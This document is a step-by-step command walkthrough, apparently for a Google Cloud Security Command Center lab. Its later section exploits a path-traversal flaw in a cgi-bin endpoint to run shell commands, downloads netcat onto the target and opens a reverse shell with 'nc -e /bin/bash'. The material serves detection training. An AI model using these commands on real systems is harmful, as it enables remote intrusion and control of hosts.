
# Detect and Investigate Threats with Security Command Center [GSP1125]

# If you consider that the video helped you to complete your lab, so please do like and subscribe [Techcps](https://www.youtube.com/@techcps)

* In the GCP Console open the Cloud Shell and enter the following commands:

```
export ZONE=
```
## Note: Go to "IAM & Admin" > "Audit Logs".
* Click the findbar and type: "Cloud Resource Manager API"

* Click the checkbox on "Cloud Resource Manager API" and select "Admin Read" then click save button.

```
gcloud services enable securitycenter.googleapis.com --project=$DEVSHELL_PROJECT_ID

sleep 15

gcloud projects add-iam-policy-binding $DEVSHELL_PROJECT_ID \
--member=user:demouser1@gmail.com --role=roles/bigquery.admin

export PROJECT_NUMBER=$(gcloud projects describe $DEVSHELL_PROJECT_ID --format="value(projectNumber)")

gcloud projects remove-iam-policy-binding $DEVSHELL_PROJECT_ID \
--member=user:demouser1@gmail.com --role=roles/bigquery.admin
```

```
gcloud compute instances create instance-1 --project=$DEVSHELL_PROJECT_ID --zone=$ZONE --machine-type=e2-medium --network-interface=network-tier=PREMIUM,stack-type=IPV4_ONLY,subnet=default --metadata=enable-oslogin=true --maintenance-policy=MIGRATE --provisioning-model=STANDARD --scopes=https://www.googleapis.com/auth/cloud-platform --create-disk=auto-delete=yes,boot=yes,device-name=instance-1,image=projects/debian-cloud/global/images/debian-11-bullseye-v20230912,mode=rw,size=10,type=projects/$DEVSHELL_PROJECT_ID/zones/$ZONE/diskTypes/pd-balanced --no-shielded-secure-boot --shielded-vtpm --shielded-integrity-monitoring --labels=goog-ec-src=vm_add-gcloud --reservation-affinity=any
```

```
gcloud dns --project=$DEVSHELL_PROJECT_ID policies create dns-test-policy --description="Please like and subscirbe to techcps" --networks="default" --alternative-name-servers="" --private-alternative-name-servers="" --no-enable-inbound-forwarding --enable-logging
```

```
gcloud compute ssh --zone "$ZONE" "instance-1" --tunnel-through-iap --project "$DEVSHELL_PROJECT_ID" --quiet --command "gcloud projects get-iam-policy \$(gcloud config get project) && curl etd-malware-trigger.goog"
```
## Note: Check the progress on task 1 & 2
* Do not move until you get score on tast 1 & 2

```
gcloud compute instances delete instance-1 --zone=$ZONE --quiet
```

```
gcloud compute instances create attacker-instance \
--scopes=cloud-platform  \
--zone=ZONE \
--machine-type=e2-medium  \
--image-family=ubuntu-2004-lts \
--image-project=ubuntu-os-cloud \
--no-address

gcloud compute networks subnets update default \
--region=REGION \
--enable-private-ip-google-access
```

## Note: Go to "Compute Engine" > "VM Instances"
* Click the SSH button on attacker-instance

### Note: Step 6 to 10 in the SSH of the VM


### Note: Go back to Cloud Shell run step 11 to 13 commands


### Note: Go to SSH of the VM and run step 16 17 18 19 commands


### Note: Go back to Cloud Shell run step 20 21 commands


## Note: Check the progress on task 4

```
curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
--path-as-is \
--insecure \
--data "echo Content-Type: text/plain; echo; id"

curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
--path-as-is \
--insecure \
--data "echo Content-Type: text/plain; echo; ls -l /"

curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
--path-as-is \
--insecure \
--data "echo Content-Type: text/plain; echo; hostname"

gsutil cp \
gs://cloud-training/gsp1125/netcat-traditional_1.10-41.1_amd64.deb .
mkdir netcat-traditional
dpkg --extract netcat-traditional_1.10-41.1_amd64.deb netcat-traditional

LOCAL_IP=$(ip -4 addr show ens4 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
echo ${LOCAL_IP}

python3 -m http.server --bind ${LOCAL_IP} \
--directory ~/netcat-traditional/bin/ 8888 &
```

```
curl http://${LOCAL_IP}:8888

curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" --path-as-is --insecure --data "echo Content-Type: text/plain; echo; curl http://${LOCAL_IP}:8888/nc.traditional -o /tmp/nc"

curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
--path-as-is \
--insecure \
--data "echo Content-Type: text/plain; echo; chmod +x /tmp/nc"

```

```
pkill python
```

```
lsof -i -sTCP:LISTEN

curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
--path-as-is \
--insecure \
--data "echo Content-Type: text/plain; echo; /tmp/nc"
```

## Note: Open the new terminal

```
nc -nlvp 8888
```

## Note: Go back first terminal

```
curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" --path-as-is --insecure --data "echo Content-Type: text/plain; echo; /tmp/nc ${LOCAL_IP} 8888 -e /bin/bash"
```

## Note: Go back to second terminal

```
ls -l /
```

# Congratulations, you're all done with the lab 😄

# Thanks for watching :)
